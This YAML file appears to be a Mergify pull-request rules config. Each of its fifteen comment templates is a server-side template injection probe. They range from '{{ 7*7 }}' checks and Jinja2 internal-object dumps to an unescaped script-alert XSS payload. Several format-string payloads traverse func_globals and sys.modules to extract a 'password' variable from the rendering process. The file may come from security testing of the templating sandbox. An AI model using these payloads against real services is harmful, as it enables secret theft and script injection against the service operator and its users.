pull_request_rules:
  - name: "Template"
    conditions:
      - "base=main"
    actions:
      comment:
        message: Thank you for your contribution @{{author}}
  - name: "Template2"
    conditions:
      - "base=main"
    actions:
      comment:
        message: Approved by @{{approved_reviews_by | join(', @')}}
  - name: "Template3"
    conditions:
      - "base=main"
    actions:
      comment:
        message: Jinja2 filters {{ body.split('----------')[0] | trim }}
  - name: "Template4"
    conditions:
      - "base=main"
    actions:
      comment:
        message: Another {{ 'payload' ~ 'other_string' }}
  - name: "Template5"
    conditions:
      - "base=main"
    actions:
      comment:
        message: Markdownify {{ body | markdownify }}
  - name: "Template6"
    conditions:
      - "base=main"
    actions:
      comment:
        message: calc test {{ 7*7 }}
  - name: "Template7"
    conditions:
      - "base=main"
    actions:
      comment:
        message: div test <div data-gb-custom-block data-tag="debug"></div>
  - name: "Template8"
    conditions:
      - "base=main"
    actions:
      comment:
        message: cycler test {{ cycler }}
  - name: "Template9"
    conditions:
      - "base=main"
    actions:
      comment:
        message: joiner test {{ joiner }}
  - name: "Template10"
    conditions:
      - "base=main"
    actions:
      comment:
        message: namespace test {{ namespace }}
  - name: "Template11"
    conditions:
      - "base=main"
    actions:
      comment:
        message: request test {{'<script>alert(1);</script>'|safe}}
  - name: "Template12"
    conditions:
      - "base=main"
    actions:
      comment:
        message: env {{ "{.func_globals[sys].modules[__main__].password}".format(0) }}
  - name: "Template13"
    conditions:
      - "base=main"
    actions:
      comment:
        message: env {{ "{._hidden_method.func_globals[sys].modules[__main__].password}".format(custom_instance) }}
  - name: "Template14"
    conditions:
      - "base=main"
    actions:
      comment:
        message: env {{ "{._asdict.func_globals[OrderedDict].clear.func_globals[_sys].modules[__main__].password}".format(named_tuple) }}
  - name: "Template15"
    conditions:
      - "base=main"
    actions:
      comment:
        message: env {{ "{.func_globals[_mutable_sequence_types][1].insert.__func__.func_globals[sys].modules[__main__].password}".format(range) }}